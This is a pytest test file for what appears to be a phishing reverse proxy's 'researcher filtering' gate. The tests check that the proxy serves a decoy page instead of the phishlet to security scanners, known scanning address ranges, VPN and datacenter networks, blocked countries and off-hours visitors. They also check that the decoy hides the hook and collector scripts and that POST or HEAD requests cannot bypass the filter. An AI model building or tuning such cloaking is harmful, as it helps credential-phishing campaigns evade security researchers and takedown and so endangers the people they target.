"""Researcher filtering: the identity-based refuse, and that it really refuses.

Unit half: organisation, address range, user agent and the operator's own file.
Integration half: a scanner user agent through the REAL proxy gets the decoy,
never the phishlet - and the refusal is recorded.

Run:  ./.venv/bin/python -m pytest tests/test_blocklist.py -v
"""
import http.client
import os
import sys
import tempfile
import threading
import time

import pytest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from conftest import free_port
from test_phishlet import UpstreamServer, two_host_phishlet

from core import blocklist as bl
from core import capture as cap
from core.gate import Gate
from core.proxy import ProxyEngine, serve_proxy

# tier marker: the Makefile and pyproject document `pytest -m integration` (run_all.py ignores markers and runs every file)
pytestmark = pytest.mark.integration


BROWSER_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")


# ================================================================== unit =====
class TestOrganisations:
    @pytest.mark.parametrize("org,isp,asn,needle", [
        ("Censys, Inc.", "", "", "censys"),
        ("", "Shodan", "AS20473", "shodan"),
        ("DigitalOcean, LLC", "", "", "digitalocean"),
        ("", "OVH SAS", "", "ovh"),
        ("NordVPN", "", "", "nordvpn"),
        ("", "Mullvad VPN AB", "", "mullvad"),
        ("Palo Alto Networks", "", "", "palo alto"),
        ("", "Cloudflare, Inc.", "", "cloudflare"),
    ])
    def test_known_networks_are_refused(self, org, isp, asn, needle):
        reason = bl.org_reason(org, isp, asn)
        assert reason and needle in reason.lower()

    def test_a_consumer_isp_passes(self):
        assert bl.org_reason("Jio Platforms Limited", "Reliance Jio", "AS55836") is None
        assert bl.org_reason("Bharti Airtel", "Airtel Broadband", "") is None

    def test_empty_org_passes(self):
        assert bl.org_reason("", "", "") is None


class TestUserAgents:
    @pytest.mark.parametrize("ua", [
        "CensysInspect/1.1; +https://about.censys.io/",
        "Shodan/1.0", "zgrab/0.x", "Mozilla/5.0 (compatible; Nuclei - Open-source project)",
        "sqlmap/1.7#stable", "python-requests/2.31.0", "curl/8.4.0", "Go-http-client/1.1",
        "Mozilla/5.0 HeadlessChrome/124.0.0.0", "WhatsApp/2.23", "TelegramBot (like TwitterBot)",
        "Mozilla/5.0 (compatible; SemrushBot/7~bl)",
    ])
    def test_scanners_are_refused(self, ua):
        assert bl.ua_reason(ua), ua

    def test_a_browser_passes(self):
        assert bl.ua_reason(BROWSER_UA) is None
        assert bl.ua_reason("Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) "
                            "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 "
                            "Mobile/15E148 Safari/604.1") is None

    def test_empty_ua_is_refused(self):
        assert "empty" in bl.ua_reason("")


class TestAddresses:
    @pytest.mark.parametrize("ip,needle", [
        ("66.240.192.5", "shodan"),        # Shodan
        ("71.6.135.131", "shodan"),
        ("162.142.125.10", "censys"),      # Censys
        ("167.94.138.7", "censys"),
        ("66.249.66.1", "google"),         # Googlebot
        ("157.55.39.5", "bing"),
    ])
    def test_known_scanning_ranges(self, ip, needle):
        reason = bl.ip_reason(ip)
        assert reason and needle in reason.lower()

    @pytest.mark.parametrize("ip", ["8.8.8.8", "49.36.1.1", "127.0.0.1", "203.0.113.9"])
    def test_ordinary_addresses_pass(self, ip):
        assert bl.ip_reason(ip) is None

    def test_garbage_ip_passes(self):
        assert bl.ip_reason("not-an-ip") is None


class TestOperatorFile:
    def test_all_four_forms_are_read(self, tmp_path):
        f = tmp_path / "block.txt"
        f.write_text("# comment\nacme-security\nua:my-scanner\nip:203.0.113.9\n"
                     "net:198.51.100.0/24\n\n")
        entry = bl.load_file(str(f))
        assert entry["org"] == ["acme-security"]
        assert entry["ua"] == ["my-scanner"]
        assert entry["ip"] == ["203.0.113.9"]
        assert entry["net"] == ["198.51.100.0/24"]

    def test_org_keyword_matches_the_isp_string(self, tmp_path):
        f = tmp_path / "block.txt"
        f.write_text("acme-security\n")
        entry = bl.load_file(str(f))
        blocked, why = bl.screen(isp="Acme-Security GmbH", entry=entry)
        assert blocked and "acme-security" in why

    def test_ua_and_ranges(self, tmp_path):
        f = tmp_path / "block.txt"
        f.write_text("ua:my-scanner\nnet:198.51.100.0/24\nip:203.0.113.9\n")
        entry = bl.load_file(str(f))
        assert bl.screen(ua="My-Scanner/2.0", entry=entry)[0]
        assert bl.screen(ip="198.51.100.55", entry=entry)[0]
        assert bl.screen(ip="203.0.113.9", entry=entry)[0]
        assert not bl.screen(ip="203.0.113.10", ua=BROWSER_UA, entry=entry)[0]

    def test_missing_file_is_not_an_error(self):
        assert bl.load_file("/nonexistent/block.txt") == {
            "org": [], "ua": [], "ip": [], "net": []}
        assert bl.load_file("")["org"] == []


class TestScreen:
    def test_a_clean_visitor_passes(self):
        blocked, why = bl.screen(ip="49.36.1.1", ua=BROWSER_UA, org="Reliance Jio")
        assert not blocked and why == ""

    def test_first_match_wins_and_explains_itself(self):
        blocked, why = bl.screen(ip="66.240.192.5", ua="CensysInspect/1.1", org="Censys, Inc.")
        assert blocked
        assert "scanning range" in why and "shodan" in why.lower()
        # and the address ranges are labelled with whose they are
        assert "censys" in bl.ip_reason("162.142.125.10").lower()

    def test_every_signal_is_independently_enough(self):
        assert bl.screen(ip="66.240.192.5")[0]
        assert bl.screen(ua="Shodan/1.0")[0]
        assert bl.screen(org="DigitalOcean")[0]
        assert bl.screen(isp="NordVPN")[0]


class TestGateIntegration:
    def test_off_by_default(self):
        g = Gate()
        assert g.block_researchers is False
        assert not g.enabled

    def test_enabling_makes_the_gate_active_and_geo_aware(self):
        g = Gate(block_researchers=True)
        assert g.enabled and g.needs_geo

    def test_gate_refuses_a_scanner_ua(self):
        g = Gate(block_researchers=True)
        allowed, why = g.check(ip="49.36.1.1", ua="CensysInspect/1.1")
        assert not allowed and "censys" in why.lower()

    def test_gate_refuses_a_scanning_range(self):
        g = Gate(block_researchers=True)
        allowed, why = g.check(ip="66.240.192.5", ua=BROWSER_UA)
        assert not allowed and "shodan" in why.lower()

    def test_gate_allows_a_real_visitor(self):
        g = Gate(block_researchers=True)
        allowed, why = g.check(ip="49.36.1.1", ua=BROWSER_UA, org="Reliance Jio")
        assert allowed and why == ""

    def test_a_file_alone_does_not_arm_the_filter(self, tmp_path):
        """Naming a file is not the same as asking for filtering.

        Arming on the mere existence of data/blocklist.txt made behaviour depend
        on leftover state, and refused the operator's own tooling (a urllib check
        carries a scanner user agent) with no visible cause.
        """
        f = tmp_path / "block.txt"
        f.write_text("ua:only-this-one\n")
        g = Gate(blocklist_file=str(f))
        assert g.block_researchers is False
        assert not g.enabled
        assert g.check(ip="49.36.1.1", ua="only-this-one/1.0")[0]

    def test_the_operator_file_is_honoured_by_the_gate(self, tmp_path):
        f = tmp_path / "block.txt"
        f.write_text("ua:only-this-one\n")
        g = Gate(block_researchers=True, blocklist_file=str(f))
        assert not g.check(ip="49.36.1.1", ua="only-this-one/1.0")[0]
        assert g.check(ip="49.36.1.1", ua=BROWSER_UA)[0]

    def test_describe_mentions_it(self):
        assert "researcher" in Gate(block_researchers=True).describe().lower()


# =========================================================== integration =====
@pytest.fixture()
def db():
    d = cap.CaptureDB(os.path.join(tempfile.mkdtemp(prefix="bh_bl_"), "bl.db"))
    yield d
    d.close()


def _fixed_clock(ts):
    """A stand-in for the time module that reports `ts` and delegates the rest
    (core.gate also calls localtime/strftime for the active-hours window)."""
    import time as _t

    class _Clock:
        time = staticmethod(lambda: ts)
        localtime = staticmethod(_t.localtime)
        gmtime = staticmethod(_t.gmtime)
        strftime = staticmethod(_t.strftime)
        mktime = staticmethod(_t.mktime)
        monotonic = staticmethod(_t.monotonic)

    return _Clock


class TestThroughTheProxy:
    def _serve(self, db, block=True, gate=None):
        up = UpstreamServer()
        up.__enter__()
        if gate is None:
            gate = Gate(block_researchers=block) if block else None
        engine = ProxyEngine(two_host_phishlet(up.port), db=db, geo_provider="off",
                             logger=lambda *a: None, gate=gate)
        port = free_port()
        httpd = serve_proxy(engine, port, campaign="bl-test")
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        time.sleep(0.25)
        return up, httpd, port

    def _get(self, port, ua, headers=None, path="/login"):
        h = {"Host": "127.0.0.1", "User-Agent": ua}
        h.update(headers or {})
        conn = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
        conn.request("GET", path, headers=h)
        r = conn.getresponse()
        body = r.read().decode("utf-8", "replace")
        status = r.status
        conn.close()
        return status, body

    def test_a_scanner_never_sees_the_phishlet(self, db):
        up, httpd, port = self._serve(db, block=True)
        try:
            status, body = self._get(port, "CensysInspect/1.1; +https://about.censys.io/")
            assert "window.__bh_hooked" not in body        # the hook is not served
            assert status in (200, 302), status
            blocked = db.blocked_list() if hasattr(db, "blocked_list") else []
            assert blocked, "the refusal must be recorded"
            assert "censys" in str(blocked[-1]).lower()
        finally:
            httpd.shutdown()
            up.__exit__()

    def test_a_real_browser_is_served(self, db):
        up, httpd, port = self._serve(db, block=True)
        try:
            status, body = self._get(port, BROWSER_UA)
            assert status == 200
            assert "window.__bh_hooked" in body, body[:400]
        finally:
            httpd.shutdown()
            up.__exit__()

    def test_a_country_rule_refuses_in_proxy_mode(self, db):
        up, httpd, port = self._serve(db, block=False, gate=Gate(block_countries=["IN"]))
        try:
            httpd.proxy_engine.geo_cached = lambda ip, ttl=300: {
                "country": "India", "country_code": "IN",
                "isp": "Reliance Jio", "org": "Reliance Jio"}
            status, body = self._get(port, BROWSER_UA)
            assert "window.__bh_hooked" not in body, "a blocked country got the phishlet"
            blocked = db.blocked_list()
            assert blocked and "IN" in blocked[-1]["reason"], blocked
            assert blocked[-1]["country"] == "India"      # the name is recorded too
        finally:
            httpd.shutdown()
            up.__exit__()

    def test_a_datacenter_rule_refuses_in_proxy_mode(self, db):
        up, httpd, port = self._serve(db, block=False, gate=Gate(block_datacenter=True))
        try:
            httpd.proxy_engine.geo_cached = lambda ip, ttl=300: {
                "country": "United States", "isp": "DigitalOcean, LLC", "org": "DigitalOcean"}
            status, body = self._get(port, BROWSER_UA)
            assert "window.__bh_hooked" not in body
            assert any("datacenter" in r["reason"] for r in db.blocked_list())
        finally:
            httpd.shutdown()
            up.__exit__()

    def test_an_ordinary_visitor_is_served(self, db):
        up, httpd, port = self._serve(db, block=False, gate=Gate(block_countries=["IN"]))
        try:
            httpd.proxy_engine.geo_cached = lambda ip, ttl=300: {
                "country": "France", "country_code": "FR",
                "isp": "OVH SAS", "org": "OVH"}
            status, body = self._get(port, BROWSER_UA)
            assert status == 200 and "window.__bh_hooked" in body
        finally:
            httpd.shutdown()
            up.__exit__()

    def test_the_hit_cap_is_enforced_and_counted(self, db):
        """--max-hits did nothing on the proxy path: note_hit had no caller."""
        up, httpd, port = self._serve(db, block=False, gate=Gate(max_hits_per_ip=1))
        try:
            _, first = self._get(port, BROWSER_UA)
            assert "window.__bh_hooked" in first
            _, second = self._get(port, BROWSER_UA)
            assert "window.__bh_hooked" not in second, "the hit cap was ignored"
            assert any("hit cap" in r["reason"] for r in db.blocked_list())
        finally:
            httpd.shutdown()
            up.__exit__()

    def test_outside_the_active_window_the_visitor_is_refused(self, db, monkeypatch):
        """active_hours is the window the campaign SERVES in. The old test used
        00:00-00:01 and skipped itself for the two minutes a day the host clock
        really fell inside it, so the rule was effectively never checked."""
        import core.gate as gate_mod
        fixed = time.mktime((2026, 1, 15, 12, 0, 0, 0, 0, -1))     # noon: outside
        monkeypatch.setattr(gate_mod, "time", _fixed_clock(fixed))
        gate = Gate(active_hours="03:00-04:00")
        up, httpd, port = self._serve(db, block=False, gate=gate)
        try:
            _, body = self._get(port, BROWSER_UA)
            assert "window.__bh_hooked" not in body, "the window was ignored"
            assert any("active hours" in r["reason"] for r in db.blocked_list())
        finally:
            httpd.shutdown()
            up.__exit__()

    def test_inside_the_active_window_the_page_is_served(self, db, monkeypatch):
        import core.gate as gate_mod
        fixed = time.mktime((2026, 1, 15, 3, 30, 0, 0, 0, -1))     # inside
        monkeypatch.setattr(gate_mod, "time", _fixed_clock(fixed))
        gate = Gate(active_hours="03:00-04:00")
        up, httpd, port = self._serve(db, block=False, gate=gate)
        try:
            _, body = self._get(port, BROWSER_UA)
            assert "window.__bh_hooked" in body, "a visit inside the window was refused"
            assert not [r for r in db.blocked_list() if "active hours" in r["reason"]]
        finally:
            httpd.shutdown()
            up.__exit__()

    def test_a_post_cannot_walk_around_the_gate(self, db):
        """The gate ran in do_GET only: a blocked visitor could simply POST the
        form (or HEAD the page) and reach the upstream anyway."""
        up, httpd, port = self._serve(db, block=True)
        try:
            conn = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
            conn.request("POST", "/sessions", body="username=a&password=b",
                         headers={"Host": "127.0.0.1",
                                  "User-Agent": "CensysInspect/1.1",
                                  "Content-Type": "application/x-www-form-urlencoded"})
            r = conn.getresponse()
            r.read()                     # the refusal body is the decoy: irrelevant
            conn.close()
            conn = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
            conn.request("HEAD", "/login", headers={"Host": "127.0.0.1",
                                                    "User-Agent": "CensysInspect/1.1"})
            r = conn.getresponse()
            r.read()                     # HEAD carries no body
            conn.close()
            reasons = [x["reason"] for x in db.blocked_list()]
            assert any("censys" in x for x in reasons), reasons
            # two refusals recorded (POST and HEAD), not just the GET path
            assert len([x for x in reasons if "censys" in x]) >= 2, reasons
            # the status itself is not the contract here: a refused visitor is
            # served the decoy whatever it returns, and the two refusal rows above
            # are what proves POST and HEAD went through the gate
        finally:
            httpd.shutdown()
            up.__exit__()

    def test_a_decoy_never_carries_the_collector_tags(self, db):
        """The decoy fix only skipped the phishlet payloads; rewrite_html still
        injected the hook and the collector tags, handing a scanner the endpoints
        and the session id."""
        up, httpd, port = self._serve(db, block=True)
        try:
            httpd.proxy_engine.phishlet.decoy = "real"
            status, body = self._get(port, "CensysInspect/1.1")
            assert status in (200, 302), status
            assert "__bh/hook.js" not in body, body[:400]
            assert "__bh/intel.js" not in body, body[:400]
            assert "window.__bh_hooked" not in body
        finally:
            httpd.shutdown()
            up.__exit__()

    def test_the_hit_cap_counts_navigations_not_assets(self, db):
        """One page load pulls in dozens of assets; counting each one burned
        --max-hits on a single visit."""
        up, httpd, port = self._serve(db, block=False, gate=Gate(max_hits_per_ip=2))
        try:
            nav = {"Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
                   "Accept": "text/html"}
            asset = {"Sec-Fetch-Dest": "script", "Accept": "*/*"}
            assert self._get(port, BROWSER_UA, headers=nav)[0] == 200
            for _i in range(5):
                self._get(port, BROWSER_UA, headers=asset)
            assert httpd.proxy_engine.gate.hits("127.0.0.1") == 1, "assets counted as hits"
            self._get(port, BROWSER_UA, headers=nav)                 # second navigation
            assert httpd.proxy_engine.gate.hits("127.0.0.1") == 2
        finally:
            httpd.shutdown()
            up.__exit__()

    def test_with_the_filter_off_the_scanner_is_served(self, db):
        up, httpd, port = self._serve(db, block=False)
        try:
            status, body = self._get(port, "CensysInspect/1.1")
            assert status == 200 and "window.__bh_hooked" in body
        finally:
            httpd.shutdown()
            up.__exit__()
